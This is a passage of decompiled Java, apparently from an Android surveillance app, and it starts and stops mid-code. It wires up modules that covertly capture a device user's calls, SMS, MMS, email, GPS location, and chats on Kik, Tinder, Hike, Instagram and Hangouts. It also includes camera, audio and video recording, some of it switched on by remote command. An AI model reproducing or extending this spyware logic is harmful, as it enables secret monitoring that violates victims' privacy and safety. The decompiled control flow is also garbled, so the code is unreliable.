          label237:
          com.vvt.v.c localc = paramh.H;
          localc.a(bool4, m, j);
        }
      }
      boolean bool2;
      label267:
      label276:
      label285:
      label294:
      do
      {
        for (;;)
        {
          return;
          bool2 = false;
          localObject1 = null;
          break;
          bool4 = false;
          localObject4 = null;
          break label199;
          int n = 0;
          localObject3 = null;
          break label218;
          bool2 = false;
          localObject1 = null;
          break label237;
          bool2 = a;
          if (!bool2) {}
        }
        bool2 = a;
      } while (!bool2);
    }
  }
  
  public static void d(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        Object localObject1 = FeatureId.CAPTURE_CALLLOG;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          Object localObject3 = RemoteFunction.ENABLE_CAPTURE_CALL;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
          localObject1 = paramh.t;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/calllog/a;
            localObject3 = paramh.a();
            localObject4 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            Object localObject5 = paramh.a();
            localObject5 = ((Context)localObject5).getContentResolver();
            q localq = paramh.h;
            ((com.vvt.capture.calllog.a)localObject1).<init>((Context)localObject3, (String)localObject4, localRunningMode, (ContentResolver)localObject5, localq);
            paramh.t = ((com.vvt.capture.calllog.a)localObject1);
          }
          localObject1 = paramh.a();
          bool1 = com.vvt.aa.b.a((Context)localObject1);
          boolean bool2 = paramPrefEventsCapture.isCaptureEnabled();
          Object localObject4 = FeatureId.CAPTURE_CALLLOG;
          boolean bool3 = paramPrefEventsCapture.isCapture((FeatureId)localObject4);
          if ((paramBoolean) && (bool2) && (bool3) && (bool1))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.t;
              ((com.vvt.capture.calllog.a)localObject1).g();
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.t;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.t;
          ((com.vvt.capture.calllog.a)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.calllog.a locala = paramh.t;
      if (locala != null)
      {
        locala = paramh.t;
        locala.h();
        locala = paramh.t;
        locala.j();
        bool1 = false;
        locala = null;
        paramh.t = null;
      }
    }
  }
  
  private static void d(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.kik.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.ac;
      if (locala == null)
      {
        locala = new com/vvt/capture/kik/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        locala.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.ac = locala;
      }
      if (paramBoolean2)
      {
        paramh.ac.a(paramb);
        locala = paramh.ac;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ac;
          locala.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ac;
      locala.h();
      continue;
      locala = paramh.ac;
      if (locala != null)
      {
        paramh.ac.h();
        paramh.ac.j();
        bool = false;
        locala = null;
        paramh.ac = null;
      }
    }
  }
  
  private static void e(AppEngine1 paramh)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = paramh.k.a();
    LicenseStatus localLicenseStatus1 = ((LicenseInfo)localObject).getLicenseStatus();
    LicenseStatus localLicenseStatus2 = LicenseStatus.ACTIVATED;
    if (localLicenseStatus1 != localLicenseStatus2)
    {
      localLicenseStatus1 = ((LicenseInfo)localObject).getLicenseStatus();
      localLicenseStatus2 = LicenseStatus.DISABLED;
      if (localLicenseStatus1 != localLicenseStatus2)
      {
        localObject = ((LicenseInfo)localObject).getLicenseStatus();
        localLicenseStatus1 = LicenseStatus.EXPIRED;
        if (localObject != localLicenseStatus1) {
          break label113;
        }
      }
    }
    bool = a;
    if (bool) {}
    localObject = paramh.s;
    bool = ((com.vvt.pushnotification.d)localObject).g();
    if (!bool)
    {
      localObject = paramh.s;
      ((com.vvt.pushnotification.d)localObject).b();
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool)
      {
        continue;
        label113:
        bool = a;
        if (bool) {}
        localObject = paramh.s;
        ((com.vvt.pushnotification.d)localObject).c();
      }
    }
  }
  
  private static void e(AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    synchronized (i.class)
    {
      boolean bool = a;
      if ((!bool) || (paramBoolean))
      {
        localc = paramh.E;
        localContext = paramh.a();
        localc.a(localContext);
        bool = a;
        if (bool) {}
        return;
      }
      com.vvt.c.c localc = paramh.E;
      Context localContext = paramh.a();
      localc.b(localContext);
    }
  }
  
  public static void e(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        Object localObject1 = FeatureId.CAPTURE_SMS;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.u;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/sms/a;
            Context localContext = paramh.a();
            localObject3 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            Object localObject4 = paramh.a();
            localObject4 = ((Context)localObject4).getContentResolver();
            q localq = paramh.h;
            ((com.vvt.capture.sms.a)localObject1).<init>(localContext, (String)localObject3, localRunningMode, (ContentResolver)localObject4, localq);
            paramh.u = ((com.vvt.capture.sms.a)localObject1);
          }
          localObject1 = paramh.a();
          bool1 = com.vvt.aa.b.a((Context)localObject1);
          boolean bool2 = a;
          if (bool2) {}
          bool2 = paramPrefEventsCapture.isCaptureEnabled();
          Object localObject3 = FeatureId.CAPTURE_SMS;
          boolean bool3 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          if ((paramBoolean) && (bool2) && (bool3) && (bool1))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.u;
              ((com.vvt.capture.sms.a)localObject1).g();
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.u;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.u;
          ((com.vvt.capture.sms.a)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.sms.a locala = paramh.u;
      if (locala != null)
      {
        locala = paramh.u;
        locala.h();
        locala = paramh.u;
        locala.j();
        bool1 = false;
        locala = null;
        paramh.u = null;
      }
    }
  }
  
  private static void e(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.tinder.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.ae;
      if (locala == null)
      {
        locala = new com/vvt/capture/tinder/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        locala.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.ae = locala;
      }
      if (paramBoolean2)
      {
        paramh.ae.a(paramb);
        locala = paramh.ae;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ae;
          locala.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ae;
      locala.h();
      continue;
      locala = paramh.ae;
      if (locala != null)
      {
        paramh.ae.h();
        paramh.ae.j();
        bool = false;
        locala = null;
        paramh.ae = null;
      }
    }
  }
  
  private static void f(AppEngine1 paramh, List paramList, boolean paramBoolean)
  {
    synchronized (i.class)
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = paramh.n;
      Object localObject2 = FxPreferenceType.KEYWORD;
      localObject2 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
      localObject2 = (PrefKeyword)localObject2;
      FeatureId localFeatureId = FeatureId.SMS_KEYWORD;
      boolean bool2 = paramList.contains(localFeatureId);
      if (bool2)
      {
        boolean bool3 = a;
        if (bool3) {}
        localObject2 = ((PrefKeyword)localObject2).getList();
        bool3 = a;
        if (bool3) {}
        localObject1 = paramh.b;
        if (localObject1 != null)
        {
          localObject1 = paramh.b;
          ((com.vvt.callmanager.ref.e)localObject1).c((List)localObject2);
        }
      }
      do
      {
        bool1 = a;
        if (bool1) {}
        return;
        ((PrefKeyword)localObject2).clearList();
        localObject2 = ((PrefKeyword)localObject2).getList();
        ((com.vvt.preference.b)localObject1).b();
        localObject1 = paramh.b;
      } while (localObject1 == null);
      localObject1 = paramh.b;
      ((com.vvt.callmanager.ref.e)localObject1).c((List)localObject2);
    }
  }
  
  public static void f(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        Object localObject1 = FeatureId.CAPTURE_MMS;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.v;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/mms/b;
            localObject3 = paramh.b();
            localObject4 = paramh.d();
            Object localObject5 = paramh.a();
            localObject5 = ((Context)localObject5).getContentResolver();
            q localq = paramh.h;
            ((com.vvt.capture.mms.b)localObject1).<init>((String)localObject3, (RunningMode)localObject4, (ContentResolver)localObject5, localq);
            paramh.v = ((com.vvt.capture.mms.b)localObject1);
          }
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          boolean bool2 = a;
          if (bool2) {}
          Object localObject3 = FeatureId.CAPTURE_MMS;
          bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          boolean bool3 = a;
          if (bool3) {}
          Object localObject4 = paramh.a();
          bool3 = com.vvt.aa.b.a((Context)localObject4);
          boolean bool4 = a;
          if ((!bool4) || ((paramBoolean) && (bool1) && (bool2) && (bool3)))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.v;
              ((com.vvt.capture.mms.b)localObject1).g();
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.v;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.v;
          ((com.vvt.capture.mms.b)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.mms.b localb = paramh.v;
      if (localb != null)
      {
        localb = paramh.v;
        localb.h();
        localb = paramh.v;
        localb.j();
        bool1 = false;
        localb = null;
        paramh.v = null;
      }
    }
  }
  
  private static void f(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.hike.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.ai;
      if (locala == null)
      {
        locala = new com/vvt/capture/hike/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        locala.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.ai = locala;
      }
      if (paramBoolean2)
      {
        paramh.ai.a(paramb);
        locala = paramh.ai;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ai;
          locala.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ai;
      locala.h();
      continue;
      locala = paramh.ai;
      if (locala != null)
      {
        paramh.ai.h();
        paramh.ai.j();
        bool = false;
        locala = null;
        paramh.ai = null;
      }
    }
  }
  
  public static void g(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      Object localObject3;
      synchronized (i.class)
      {
        Object localObject1 = FeatureId.CAPTURE_LOCATION;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.z;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/location/c;
            localObject3 = paramh.d();
            localObject4 = paramh.a();
            String str = paramh.b();
            ((com.vvt.capture.location.c)localObject1).<init>((RunningMode)localObject3, (Context)localObject4, str);
            paramh.z = ((com.vvt.capture.location.a)localObject1);
          }
          localObject1 = paramh.z;
          bool1 = ((com.vvt.capture.location.a)localObject1).a();
          boolean bool2 = paramPrefEventsCapture.isCaptureEnabled();
          Object localObject4 = FeatureId.CAPTURE_LOCATION;
          boolean bool3 = paramPrefEventsCapture.isCapture((FeatureId)localObject4);
          if ((paramBoolean) && (bool2) && (bool3) && (bool1))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.z;
              localObject3 = CallingModule.CORE;
              localObject4 = paramh.h;
              ((com.vvt.capture.location.a)localObject1).b((CallingModule)localObject3, (com.vvt.base.a)localObject4);
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.z;
              localObject3 = CallingModule.CORE;
              localObject4 = paramh.h;
              ((com.vvt.capture.location.a)localObject1).a((CallingModule)localObject3, (com.vvt.base.a)localObject4);
              long l = paramPrefEventsCapture.getGpsTrackingIntervalMs();
              localObject1 = paramh.z;
              ((com.vvt.capture.location.a)localObject1).a(l);
              bool1 = a;
              if (bool1) {}
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.z;
              localObject3 = CallingModule.CORE;
              ((com.vvt.capture.location.a)localObject1).a((CallingModule)localObject3);
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.z;
          localObject3 = CallingModule.CORE;
          localObject4 = paramh.h;
          ((com.vvt.capture.location.a)localObject1).b((CallingModule)localObject3, (com.vvt.base.a)localObject4);
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.z;
          localObject3 = CallingModule.CORE;
          ((com.vvt.capture.location.a)localObject1).b((CallingModule)localObject3);
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.location.a locala = paramh.z;
      if (locala != null)
      {
        locala = paramh.z;
        localObject3 = CallingModule.ALERT;
        locala.b((CallingModule)localObject3);
        locala = paramh.z;
        localObject3 = CallingModule.CORE;
        locala.b((CallingModule)localObject3);
        locala = paramh.z;
        localObject3 = CallingModule.ON_DEMAND;
        locala.b((CallingModule)localObject3);
        locala = paramh.z;
        localObject3 = CallingModule.PANIC;
        locala.b((CallingModule)localObject3);
        locala = paramh.z;
        locala.b();
        bool1 = false;
        locala = null;
        paramh.z = null;
      }
    }
  }
  
  private static void g(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    boolean bool = a;
    com.vvt.capture.instagram.directmessage.a locala;
    if ((!bool) || (paramBoolean1))
    {
      locala = paramh.af;
      if (locala == null)
      {
        locala = new com/vvt/capture/instagram/directmessage/a;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        locala.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.af = locala;
      }
      if (paramBoolean2)
      {
        paramh.af.a(paramb);
        locala = paramh.af;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.af;
          locala.g();
        }
      }
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      bool = a;
      if (bool) {}
      locala = paramh.af;
      locala.h();
      continue;
      locala = paramh.af;
      if (locala != null)
      {
        paramh.af.h();
        paramh.af.j();
        bool = false;
        locala = null;
        paramh.af = null;
      }
    }
  }
  
  public static void h(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    boolean bool1 = true;
    for (;;)
    {
      synchronized (i.class)
      {
        bool2 = a;
        if (bool2) {}
        bool2 = a;
        if (bool2) {}
        Object localObject1 = paramh.d();
        Object localObject4 = RunningMode.LIMITED_1;
        if (localObject1 != localObject4)
        {
          localObject1 = paramh.d();
          localObject4 = RunningMode.FULL;
          if (localObject1 != localObject4) {}
        }
        else
        {
          localObject1 = FeatureId.CAPTURE_EMAIL;
          bool2 = paramList.contains(localObject1);
          if (bool2)
          {
            bool2 = bool1;
            if (!bool2) {
              break label692;
            }
            localObject1 = paramh.w;
            if (localObject1 == null)
            {
              localObject1 = new com/vvt/capture/email/b/a;
              localObject4 = paramh.b();
              localObject5 = paramh.d();
              localObject6 = paramh.h;
              localContext = paramh.a();
              localc = paramh.V;
              localObject7 = paramh.c();
              ((com.vvt.capture.email.b.a)localObject1).<init>((String)localObject4, (RunningMode)localObject5, (com.vvt.base.a)localObject6, localContext, localc, (String)localObject7);
              paramh.w = ((com.vvt.capture.email.b.a)localObject1);
            }
            localObject1 = paramh.y;
            if (localObject1 == null)
            {
              localObject1 = paramh.w;
              localObject7 = ((com.vvt.capture.email.b.a)localObject1).b();
              bool2 = localObject7 instanceof com.vvt.capture.email.b.a.a;
              if (!bool2) {
                continue;
              }
              localObject1 = new com/vvt/capture/email/gmail/a;
              localObject4 = paramh.b();
              localObject5 = paramh.h;
              localObject6 = paramh.d();
              localContext = paramh.a();
              localc = paramh.V;
              localObject7 = (com.vvt.capture.email.b.a.a)localObject7;
              str = paramh.c();
              ((com.vvt.capture.email.gmail.a)localObject1).<init>((String)localObject4, (com.vvt.base.a)localObject5, (RunningMode)localObject6, localContext, localc, (m)localObject7, str);
              paramh.y = ((com.vvt.capture.email.gmail.a)localObject1);
            }
            localObject1 = paramh.x;
            if (localObject1 == null)
            {
              localObject1 = new com/vvt/capture/email/generic/a;
              localObject4 = paramh.b();
              localObject5 = paramh.d();
              localObject6 = paramh.h;
              localContext = paramh.a();
              localc = paramh.V;
              localObject7 = paramh.c();
              ((com.vvt.capture.email.generic.a)localObject1).<init>((String)localObject4, (RunningMode)localObject5, (com.vvt.base.a)localObject6, localContext, localc, (String)localObject7);
              paramh.x = ((com.vvt.capture.email.generic.a)localObject1);
            }
            bool2 = paramPrefEventsCapture.isCaptureEnabled();
            localObject4 = FeatureId.CAPTURE_EMAIL;
            boolean bool3 = paramPrefEventsCapture.isCapture((FeatureId)localObject4);
            if ((!paramBoolean) || (!bool2) || (!bool3)) {
              break label637;
            }
            bool2 = bool1;
            bool3 = a;
            if ((bool3) && (!bool2)) {
              break label646;
            }
            localObject1 = paramh.y;
            bool2 = ((com.vvt.capture.email.gmail.a)localObject1).k();
            if (!bool2)
            {
              bool2 = a;
              if (bool2) {}
              localObject1 = paramh.y;
              ((com.vvt.capture.email.gmail.a)localObject1).g();
            }
            localObject1 = paramh.x;
            bool2 = ((com.vvt.capture.email.generic.a)localObject1).k();
            if (!bool2)
            {
              bool2 = a;
              if (bool2) {}
              localObject1 = paramh.x;
              ((com.vvt.capture.email.generic.a)localObject1).g();
            }
            localObject1 = paramh.w;
            bool2 = ((com.vvt.capture.email.b.a)localObject1).k();
            if (!bool2)
            {
              bool2 = a;
              if (bool2) {}
              localObject1 = paramh.w;
              ((com.vvt.capture.email.b.a)localObject1).g();
            }
            bool2 = a;
            if (bool2) {}
            return;
          }
        }
        bool2 = false;
        localObject1 = null;
        continue;
        bool2 = localObject7 instanceof com.vvt.capture.email.b.b.a;
        if (!bool2) {
          continue;
        }
        localObject1 = new com/vvt/capture/email/gmail/a;
        localObject4 = paramh.b();
        Object localObject5 = paramh.h;
        Object localObject6 = paramh.d();
        Context localContext = paramh.a();
        com.vvt.n.a.c localc = paramh.V;
        Object localObject7 = null;
        String str = paramh.c();
        ((com.vvt.capture.email.gmail.a)localObject1).<init>((String)localObject4, (com.vvt.base.a)localObject5, (RunningMode)localObject6, localContext, localc, null, str);
        paramh.y = ((com.vvt.capture.email.gmail.a)localObject1);
      }
      label637:
      boolean bool2 = false;
      Object localObject3 = null;
      continue;
      label646:
      bool2 = a;
      if (bool2) {}
      localObject3 = paramh.y;
      ((com.vvt.capture.email.gmail.a)localObject3).h();
      localObject3 = paramh.x;
      ((com.vvt.capture.email.generic.a)localObject3).h();
      localObject3 = paramh.w;
      ((com.vvt.capture.email.b.a)localObject3).h();
      continue;
      label692:
      bool2 = a;
      if (bool2) {}
      localObject3 = paramh.y;
      if (localObject3 != null)
      {
        localObject3 = paramh.y;
        ((com.vvt.capture.email.gmail.a)localObject3).h();
        localObject3 = paramh.y;
        ((com.vvt.capture.email.gmail.a)localObject3).j();
        bool2 = false;
        localObject3 = null;
        paramh.y = null;
      }
      localObject3 = paramh.x;
      if (localObject3 != null)
      {
        localObject3 = paramh.x;
        ((com.vvt.capture.email.generic.a)localObject3).h();
        localObject3 = paramh.x;
        ((com.vvt.capture.email.generic.a)localObject3).j();
        bool2 = false;
        localObject3 = null;
        paramh.x = null;
      }
      localObject3 = paramh.w;
      if (localObject3 != null)
      {
        localObject3 = paramh.w;
        ((com.vvt.capture.email.b.a)localObject3).h();
        localObject3 = paramh.w;
        ((com.vvt.capture.email.b.a)localObject3).j();
        bool2 = false;
        localObject3 = null;
        paramh.w = null;
      }
    }
  }
  
  private static void h(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.hangouts.f localf;
    boolean bool;
    if (paramBoolean1)
    {
      localf = paramh.aa;
      if (localf == null)
      {
        localf = new com/vvt/capture/hangouts/f;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        Context localContext = paramh.a();
        localf.<init>(str, localq, localRunningMode, localc, localContext, paramb);
        paramh.aa = localf;
      }
      if (paramBoolean2)
      {
        paramh.aa.a(paramb);
        localf = paramh.aa;
        bool = localf.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localf = paramh.aa;
          localf.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localf = paramh.aa;
      localf.h();
      continue;
      localf = paramh.aa;
      if (localf != null)
      {
        paramh.aa.h();
        paramh.aa.j();
        bool = false;
        localf = null;
        paramh.aa = null;
      }
    }
  }
  
  public static void i(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_CAMERAIMAGE;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          Object localObject3 = RemoteFunction.ENABLE_CAPTURE_IMAGE;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
          localObject1 = paramh.D;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/camera/image/a;
            localObject3 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            Object localObject4 = paramh.a();
            localObject4 = ((Context)localObject4).getContentResolver();
            q localq = paramh.h;
            ((com.vvt.capture.camera.image.a)localObject1).<init>((String)localObject3, localRunningMode, (ContentResolver)localObject4, localq);
            paramh.D = ((com.vvt.capture.camera.image.a)localObject1);
          }
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          localObject3 = FeatureId.CAPTURE_CAMERAIMAGE;
          boolean bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          if ((paramBoolean) && (bool1) && (bool2))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.D;
              ((com.vvt.capture.camera.image.a)localObject1).g();
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.D;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.D;
          ((com.vvt.capture.camera.image.a)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.camera.image.a locala = paramh.D;
      if (locala != null)
      {
        locala = paramh.D;
        locala.h();
        locala = paramh.D;
        locala.j();
        bool1 = false;
        locala = null;
        paramh.D = null;
      }
    }
  }
  
  private static void i(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.e.c localc;
    boolean bool;
    if (paramBoolean1)
    {
      localc = paramh.P;
      if (localc == null)
      {
        localc = new com/vvt/capture/e/c;
        String str = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc1 = paramh.V;
        localc.<init>(str, localq, localRunningMode, localc1, paramb);
        paramh.P = localc;
      }
      if (paramBoolean2)
      {
        bool = a;
        if (bool) {}
        paramh.P.a(paramb);
        localc = paramh.P;
        bool = localc.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          localc = paramh.P;
          localc.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      localc = paramh.P;
      localc.h();
      continue;
      localc = paramh.P;
      if (localc != null)
      {
        paramh.P.h();
        paramh.P.j();
        bool = false;
        localc = null;
        paramh.P = null;
      }
    }
  }
  
  public static void j(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_SOUND_RECORDING;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          Object localObject3 = RemoteFunction.ENABLE_CAPTURE_AUDIO;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
          localObject1 = paramh.G;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/audio/a;
            localObject3 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            Object localObject4 = paramh.a();
            localObject4 = ((Context)localObject4).getContentResolver();
            q localq = paramh.h;
            ((com.vvt.capture.audio.a)localObject1).<init>((String)localObject3, localRunningMode, (ContentResolver)localObject4, localq);
            paramh.G = ((com.vvt.capture.audio.a)localObject1);
          }
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          localObject3 = FeatureId.CAPTURE_VIDEO_RECORDING;
          boolean bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          if ((paramBoolean) && (bool1) && (bool2))
          {
            bool1 = true;
            bool2 = a;
            if ((!bool2) || (bool1))
            {
              bool1 = a;
              if (bool1) {}
              localObject1 = paramh.G;
              ((com.vvt.capture.audio.a)localObject1).g();
              bool1 = a;
              if (!bool1) {}
            }
          }
          else
          {
            bool1 = false;
            localObject1 = null;
            continue;
          }
          localObject1 = paramh.G;
          if (localObject1 == null) {
            continue;
          }
          bool1 = a;
          if (bool1) {}
          localObject1 = paramh.G;
          ((com.vvt.capture.audio.a)localObject1).h();
        }
      }
      boolean bool1 = a;
      if (bool1) {}
      com.vvt.capture.audio.a locala = paramh.G;
      if (locala != null)
      {
        locala = paramh.G;
        locala.h();
        locala = paramh.G;
        locala.j();
        bool1 = false;
        locala = null;
        paramh.G = null;
      }
    }
  }
  
  private static void j(boolean paramBoolean1, boolean paramBoolean2, AppEngine1 paramh, com.vvt.base.b paramb)
  {
    com.vvt.capture.e.c.a.a locala;
    boolean bool;
    if (paramBoolean1)
    {
      locala = paramh.ao;
      if (locala == null)
      {
        locala = new com/vvt/capture/e/c/a/a;
        String str1 = paramh.b();
        q localq = paramh.h;
        RunningMode localRunningMode = paramh.d();
        com.vvt.n.a.c localc = paramh.V;
        String str2 = paramb.f();
        locala.<init>(str1, localq, localRunningMode, localc, str2);
        paramh.ao = locala;
      }
      if (paramBoolean2)
      {
        locala = paramh.ao;
        bool = locala.k();
        if (!bool)
        {
          bool = a;
          if (bool) {}
          locala = paramh.ao;
          locala.g();
        }
      }
    }
    for (;;)
    {
      return;
      bool = a;
      if (bool) {}
      locala = paramh.ao;
      locala.h();
      continue;
      locala = paramh.ao;
      if (locala != null)
      {
        paramh.ao.h();
        paramh.ao.j();
        bool = false;
        locala = null;
        paramh.ao = null;
      }
    }
  }
  
  public static void k(AppEngine1 paramh, List paramList, boolean paramBoolean, PrefEventsCapture paramPrefEventsCapture)
  {
    for (;;)
    {
      synchronized (i.class)
      {
        bool1 = a;
        if (bool1) {}
        Object localObject1 = FeatureId.CAPTURE_VIDEO_RECORDING;
        bool1 = paramList.contains(localObject1);
        if (bool1)
        {
          localObject1 = paramh.q;
          Object localObject3 = RemoteFunction.ENABLE_CAPTURE_VIDEO;
          ((RemoteControlImpl)localObject1).registerFunction((RemoteFunction)localObject3);
          localObject1 = paramh.F;
          if (localObject1 == null)
          {
            localObject1 = new com/vvt/capture/camera/video/a;
            localObject3 = paramh.b();
            RunningMode localRunningMode = paramh.d();
            Object localObject4 = paramh.a();
            localObject4 = ((Context)localObject4).getContentResolver();
            q localq = paramh.h;
            ((com.vvt.capture.camera.video.a)localObject1).<init>((String)localObject3, localRunningMode, (ContentResolver)localObject4, localq);
            paramh.F = ((com.vvt.capture.camera.video.a)localObject1);
          }
          bool1 = paramPrefEventsCapture.isCaptureEnabled();
          localObject3 = FeatureId.CAPTURE_VIDEO_RECORDING;
          boolean bool2 = paramPrefEventsCapture.isCapture((FeatureId)localObject3);
          if ((paramBoolean) && (bool1) && (bool2))
          {
